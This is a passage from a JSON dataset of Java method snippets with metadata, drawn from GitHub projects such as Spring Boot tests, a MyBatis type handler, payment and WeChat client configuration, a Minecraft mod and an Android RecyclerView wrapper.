[], "return_type": "void", "snippet": "\tvoid testCustomBannerInContext() {\n\t\tSpringApplication application = createSpringApplication();\n\t\tBanner banner = mock(Banner.class);\n\t\tapplication.setBanner(banner);\n\t\tthis.context = application.run();\n\t\tBanner printedBanner = (Banner) this.context.getBean(\"springBootBanner\");\n\t\tassertThat(printedBanner).hasFieldOrPropertyWithValue(\"banner\", banner);\n\t\tverify(banner).printBanner(any(Environment.class), this.sourceClassCaptor.capture(), any(PrintStream.class));\n\t\treset(banner);\n\t\tprintedBanner.printBanner(this.context.getEnvironment(), null, System.out);\n\t\tverify(banner).printBanner(any(Environment.class), eq(this.sourceClassCaptor.getValue()),\n\t\t\t\tany(PrintStream.class));\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/BannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33707, "method_name": "testDisableBannerInContext", "class_name": "BannerTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testDisableBannerInContext() {\n\t\tSpringApplication application = createSpringApplication();\n\t\tapplication.setBannerMode(Mode.OFF);\n\t\tthis.context = application.run();\n\t\tassertThat(this.context.containsBean(\"springBootBanner\")).isFalse();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/BannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33708, "method_name": "createSpringApplication", "class_name": "BannerTests", "params": [], "throws": null, "modifiers": ["private"], "return_type": "SpringApplication", "snippet": "\tprivate SpringApplication createSpringApplication() {\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\treturn application;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/BannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33709, "method_name": "printBanner", "class_name": "DummyBanner", "params": ["Environment", "Class<?>", "PrintStream"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void printBanner(Environment environment, Class<?> sourceClass, PrintStream out) {\n\t\t\tout.println(\"My Banner\");\n\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/BannerTests.java", "stars": "47572", "class_props": {"extends": null, "implements": ["Banner"], "modifiers": ["static"]}}, {"id": 33710, "method_name": "setNonNullParameter", "class_name": "DoubleTypeHandler", "params": ["PreparedStatement", "int", "Double", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, Double parameter, JdbcType jdbcType)\n      throws SQLException {\n    ps.setDouble(i, parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/DoubleTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 33711, "method_name": "getNullableResult", "class_name": "DoubleTypeHandler", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Double", "snippet": "  public Double getNullableResult(ResultSet rs, String columnName)\n      throws SQLException {\n    double result = rs.getDouble(columnName);\n    return result == 0 && rs.wasNull() ? null : result;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/DoubleTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 33712, "method_name": "getNullableResult", "class_name": "DoubleTypeHandler", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Double", "snippet": "  public Double getNullableResult(ResultSet rs, int columnIndex)\n      throws SQLException {\n    double result = rs.getDouble(columnIndex);\n    return result == 0 && rs.wasNull() ? null : result;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/DoubleTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 33713, "method_name": "getNullableResult", "class_name": "DoubleTypeHandler", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Double", "snippet": "  public Double getNullableResult(CallableStatement cs, int columnIndex)\n      throws SQLException {\n    double result = cs.getDouble(columnIndex);\n    return result == 0 && cs.wasNull() ? null : result;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/DoubleTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 33714, "method_name": "wxMpService", "class_name": "SecurityAutoConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "WxMpService", "snippet": "    public WxMpService wxMpService() {\n        WxMpService wxMpService = new WxMpServiceImpl();\n        WxMpInMemoryConfigStorage wxMpConfigStorage = new WxMpInMemoryConfigStorage();\n        wxMpConfigStorage.setAppId(securityProperties.getWx().getAppId());\n        log.debug(\"mp appid: {}\", securityProperties.getWx().getAppId());\n        wxMpConfigStorage.setSecret(securityProperties.getWx().getAppSecret());\n        wxMpConfigStorage.setToken(securityProperties.getWx().getToken());\n        wxMpConfigStorage.setAesKey(securityProperties.getWx().getAesKey());\n        wxMpService.setWxMpConfigStorage(wxMpConfigStorage);\n        return wxMpService;\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/SecurityAutoConfiguration.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33715, "method_name": "alipayClient", "class_name": "SecurityAutoConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AlipayClient", "snippet": "    public AlipayClient alipayClient() {\n        return new DefaultAlipayClient(\n                \"https://openapi.alipay.com/gateway.do\",\n                securityProperties.getAli().getAppId(),\n                securityProperties.getAli().getPrivateKey(),\n                \"json\",\n                CharsetUtil.UTF_8,\n                securityProperties.getAli().getPublicKey(),\n                \"RSA2\"\n        );\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/SecurityAutoConfiguration.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33716, "method_name": "passwordEncoder", "class_name": "SecurityAutoConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PasswordEncoder", "snippet": "    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/SecurityAutoConfiguration.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33717, "method_name": "initElements", "class_name": "ThatchSlabBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/ThatchSlabBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 33718, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, state.get(TYPE) == SlabType.DOUBLE ? 2 : 1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/ThatchSlabBlock.java", "stars": "2", "class_props": {"extends": "SlabBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 33719, "method_name": "operate", "class_name": "OperateBarrier", "params": ["String", "Supplier<R>"], "throws": null, "modifiers": ["public", "static"], "return_type": "R", "snippet": "    public static <R>R operate(String operateId, Supplier<R> operate){\n        Barrier barrier = barrierMap.computeIfAbsent(operateId, key -> new Barrier(operateId));\n        boolean signal = inQueue(barrier);\n        try{\n            //Execute in async\n            return operate.get();\n        }finally{\n            deQueue(barrier, signal);\n\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/OperateBarrier.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33720, "method_name": "inQueue", "class_name": "OperateBarrier", "params": ["Barrier"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "    private static boolean inQueue(Barrier barrier){\n        boolean signal = true;\n        barrier.barrierLock.lock();\n        try {\n            if(barrier.enQueueCount.get() > 0){\n                //Just wait in certain time\n                signal = barrier.enQueueCondition.await(BARRIER_EXIST_IN_SECONDS, TimeUnit.SECONDS);\n            }\n            barrier.enQueueCount.incrementAndGet();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            //Ignore\n        } finally{\n            barrier.barrierLock.unlock();\n        }\n        return signal;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/OperateBarrier.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33721, "method_name": "deQueue", "class_name": "OperateBarrier", "params": ["Barrier", "boolean"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void  deQueue(Barrier barrier, boolean signal){\n        barrier.barrierLock.lock();\n        try{\n            if(barrier.enQueueCount.get() > 0 ){\n                if(signal) {\n                    //Just signal one thread\n                    barrier.enQueueCondition.signal();\n                }\n                barrier.enQueueCount.decrementAndGet();\n            }\n            if(!barrier.barrierLock.hasWaiters(barrier.enQueueCondition)) {\n                barrierMap.remove(barrier.id);\n            }\n        }finally{\n            barrier.barrierLock.unlock();\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/OperateBarrier.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33722, "method_name": "setAdapter", "class_name": "WrapRecyclerView", "params": ["Adapter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAdapter(Adapter adapter) {\n        mRealAdapter = adapter;\n        // \u5077\u6881\u6362\u67f1\n        mWrapAdapter.setRealAdapter(mRealAdapter);\n        super.setAdapter(mWrapAdapter);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33723, "method_name": "getAdapter", "class_name": "WrapRecyclerView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Adapter", "snippet": "    public Adapter getAdapter() {\n        return mRealAdapter;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33724, "method_name": "addHeaderView", "class_name": "WrapRecyclerView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addHeaderView(View view) {\n        mWrapAdapter.addHeaderView(view);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33725, "method_name": "addHeaderView", "class_name": "WrapRecyclerView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "V", "snippet": "    public <V extends View> V addHeaderView(@LayoutRes int id) {\n        View headerView = LayoutInflater.from(getContext()).inflate(id, this, false);\n        addHeaderView(headerView);\n        return (V) headerView;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33726, "method_name": "removeHeaderView", "class_name": "WrapRecyclerView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeHeaderView(View view) {\n        mWrapAdapter.removeHeaderView(view);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33727, "method_name": "addFooterView", "class_name": "WrapRecyclerView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addFooterView(View view) {\n        mWrapAdapter.addFooterView(view);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33728, "method_name": "addFooterView", "class_name": "WrapRecyclerView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "V", "snippet": "    public <V extends View> V addFooterView(@LayoutRes int id) {\n        View footerView = LayoutInflater.from(getContext()).inflate(id, this, false);\n        addFooterView(footerView);\n        return (V) footerView;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33729, "method_name": "removeFooterView", "class_name": "WrapRecyclerView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeFooterView(View view) {\n        mWrapAdapter.removeFooterView(view);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33730, "method_name": "getHeaderViewsCount", "class_name": "WrapRecyclerView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getHeaderViewsCount() {\n        return mWrapAdapter.getHeaderViewsCount();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33731, "method_name": "getFooterViewsCount", "class_name": "WrapRecyclerView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getFooterViewsCount() {\n        return mWrapAdapter.getFooterViewsCount();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33732, "method_name": "getHeaderViews", "class_name": "WrapRecyclerView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<View>", "snippet": "    public List<View> getHeaderViews() {\n        return mWrapAdapter.getHeaderViews();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33733, "method_name": "getFooterViews", "class_name": "WrapRecyclerView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<View>", "snippet": "    public List<View> getFooterViews() {\n        return mWrapAdapter.getFooterViews();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33734, "method_name": "refreshHeaderFooterViews", "class_name": "WrapRecyclerView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void refreshHeaderFooterViews() {\n        mWrapAdapter.notifyDataSetChanged();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 33735, "method_name": "setRealAdapter", "class_name": "WrapRecyclerAdapter", "params": ["RecyclerView"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void setRealAdapter(RecyclerView.Adapter adapter) {\n            if (mRealAdapter != adapter) {\n\n                if (mRealAdapter != null) {\n                    if (mObserver != null) {\n                        // \u4e3a\u539f\u6709\u7684RecyclerAdapter\u79fb\u9664\u6570\u636e\u76d1\u542c\u5bf9\u8c61\n                        mRealAdapter.unregisterAdapterDataObserver(mObserver);\n                    }\n                }\n\n                mRealAdapter = adapter;\n                if (mRealAdapter != null) {\n                    if (mObserver == null) {\n                        mObserver = new WrapAdapterDataObserver(this);\n                    }\n                    // \u4e3a\u539f\u6709\u7684RecyclerAdapter\u6dfb\u52a0\u6570\u636e\u76d1\u542c\u5bf9\u8c61\n                    mRealAdapter.registerAdapterDataObserver(mObserver);\n                    // \u9002\u914d\u5668\u4e0d\u662f\u7b2c\u4e00\u6b21\u88ab\u7ed1\u5b9a\u5230RecyclerView\u4e0a\u9700\u8981\u53d1\u9001\u901a\u77e5\uff0c\u56e0\u4e3a\u7b2c\u4e00\u6b21\u7ed1\u5b9a\u4f1a\u81ea\u52a8\u901a\u77e5\n                    if (mRecyclerView != null) {\n                        notifyDataSetChanged();\n                    }\n                }\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33736, "method_name": "getItemCount", "class_name": "WrapRecyclerAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getItemCount() {\n            if (mRealAdapter != null) {\n                return getHeaderViewsCount() + mRealAdapter.getItemCount() + getFooterViewsCount();\n            }else {\n                return getHeaderViewsCount() + getFooterViewsCount();\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33737, "method_name": "getItemViewType", "class_name": "WrapRecyclerAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getItemViewType(int position) {\n            mCurrentPosition = position;\n            // \u83b7\u53d6\u5934\u90e8\u5e03\u5c40\u7684\u603b\u6570\n            int headerCount = getHeaderViewsCount();\n            // \u83b7\u53d6\u539f\u6709\u9002\u914d\u5668\u7684\u603b\u6570\n            int adapterCount = mRealAdapter != null ? mRealAdapter.getItemCount() : 0;\n            // \u83b7\u53d6\u5728\u539f\u6709\u9002\u914d\u5668\u4e0a\u7684\u4f4d\u7f6e\n            int adjPosition = position - headerCount;\n            if (position < headerCount) {\n                return HEADER_VIEW_TYPE;\n            }else if (adjPosition < adapterCount) {\n                return mRealAdapter.getItemViewType(adjPosition);\n            }else {\n                return FOOTER_VIEW_TYPE;\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33738, "method_name": "getPosition", "class_name": "WrapRecyclerAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getPosition() {\n            return mCurrentPosition;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33739, "method_name": "onCreateViewHolder", "class_name": "WrapRecyclerAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "RecyclerView", "snippet": "        public RecyclerView.ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n            switch (viewType) {\n                case HEADER_VIEW_TYPE:\n                    return newWrapViewHolder(mHeaderViews.get(getPosition()));\n                case FOOTER_VIEW_TYPE:\n                    return newWrapViewHolder(mFooterViews.get(getPosition() - getHeaderViewsCount() - (mRealAdapter != null ? mRealAdapter.getItemCount() : 0)));\n                default:\n                    int itemViewType = mRealAdapter.getItemViewType(getPosition() - getHeaderViewsCount());\n                    if (itemViewType == HEADER_VIEW_TYPE || itemViewType == FOOTER_VIEW_TYPE) {\n                        throw new IllegalStateException(\"Please do not use this type as itemType\");\n                    }\n                    if (mRealAdapter != null) {\n                        return mRealAdapter.onCreateViewHolder(parent, itemViewType);\n                    } else {\n                        return null;\n                    }\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33740, "method_name": "onBindViewHolder", "class_name": "WrapRecyclerAdapter", "params": ["RecyclerView", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder, int position) {\n            int viewType = getItemViewType(position);\n            switch (viewType) {\n                case HEADER_VIEW_TYPE:\n                case FOOTER_VIEW_TYPE:\n                    break;\n                default:\n                    if (mRealAdapter != null) {\n                        mRealAdapter.onBindViewHolder(holder, getPosition() - getHeaderViewsCount());\n                    }\n                    break;\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33741, "method_name": "newWrapViewHolder", "class_name": "WrapRecyclerAdapter", "params": ["View"], "throws": null, "modifiers": ["private"], "return_type": "WrapViewHolder", "snippet": "        private WrapViewHolder newWrapViewHolder(View view) {\n            ViewParent parent =  view.getParent();\n            if (parent instanceof ViewGroup) {\n                // IllegalStateException: ViewHolder views must not be attached when created.\n                // Ensure that you are not passing 'true' to the attachToRoot parameter of LayoutInflater.inflate(..., boolean attachToRoot)\n                ((ViewGroup) parent).removeView(view);\n            }\n            return new WrapViewHolder(view);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33742, "method_name": "getItemId", "class_name": "WrapRecyclerAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "        public long getItemId(int position) {\n            if (mRealAdapter != null && position > getHeaderViewsCount() - 1 && position < getHeaderViewsCount() + mRealAdapter.getItemCount()) {\n                return mRealAdapter.getItemId(position - getHeaderViewsCount());\n            } else {\n                return super.getItemId(position);\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33743, "method_name": "onAttachedToRecyclerView", "class_name": "WrapRecyclerAdapter", "params": ["RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onAttachedToRecyclerView(@NonNull RecyclerView recyclerView) {\n            mRecyclerView = recyclerView;\n            if (mRealAdapter != null) {\n                mRealAdapter.onAttachedToRecyclerView(recyclerView);\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33744, "method_name": "onDetachedFromRecyclerView", "class_name": "WrapRecyclerAdapter", "params": ["RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onDetachedFromRecyclerView(@NonNull RecyclerView recyclerView) {\n            mRecyclerView = null;\n            if (mRealAdapter != null) {\n                mRealAdapter.onDetachedFromRecyclerView(recyclerView);\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33745, "method_name": "onViewRecycled", "class_name": "WrapRecyclerAdapter", "params": ["ViewHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onViewRecycled(@NonNull ViewHolder holder) {\n            if (holder instanceof WrapViewHolder) {\n                // \u9632\u6b62\u8fd9\u4e2a ViewHolder \u88ab RecyclerView \u62ff\u53bb\u590d\u7528\n                holder.setIsRecyclable(false);\n                return;\n            }\n            if (mRealAdapter != null) {\n                mRealAdapter.onViewRecycled(holder);\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33746, "method_name": "onFailedToRecycleView", "class_name": "WrapRecyclerAdapter", "params": ["ViewHolder"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean onFailedToRecycleView(@NonNull ViewHolder holder) {\n            if (mRealAdapter != null) {\n                return mRealAdapter.onFailedToRecycleView(holder);\n            }\n            return super.onFailedToRecycleView(holder);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33747, "method_name": "onViewAttachedToWindow", "class_name": "WrapRecyclerAdapter", "params": ["ViewHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onViewAttachedToWindow(@NonNull ViewHolder holder) {\n            if (mRealAdapter != null) {\n                mRealAdapter.onViewAttachedToWindow(holder);\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33748, "method_name": "onViewDetachedFromWindow", "class_name": "WrapRecyclerAdapter", "params": ["ViewHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onViewDetachedFromWindow(@NonNull ViewHolder holder) {\n            if (mRealAdapter != null) {\n                mRealAdapter.onViewDetachedFromWindow(holder);\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33749, "method_name": "addHeaderView", "class_name": "WrapRecyclerAdapter", "params": ["View"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void addHeaderView(View view) {\n            // \u4e0d\u80fd\u6dfb\u52a0\u540c\u4e00\u4e2aView\u5bf9\u8c61\uff0c\u5426\u5219\u4f1a\u5bfc\u81f4RecyclerView\u590d\u7528\u5f02\u5e38\n            if (!mHeaderViews.contains(view) && !mFooterViews.contains(view)) {\n                adjustSpanSize(mRecyclerView, this, mRealAdapter);\n                mHeaderViews.add(view);\n                notifyDataSetChanged();\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33750, "method_name": "removeHeaderView", "class_name": "WrapRecyclerAdapter", "params": ["View"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void removeHeaderView(View view) {\n            if (mHeaderViews.remove(view)) {\n                notifyDataSetChanged();\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33751, "method_name": "addFooterView", "class_name": "WrapRecyclerAdapter", "params": ["View"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void addFooterView(View view) {\n            // 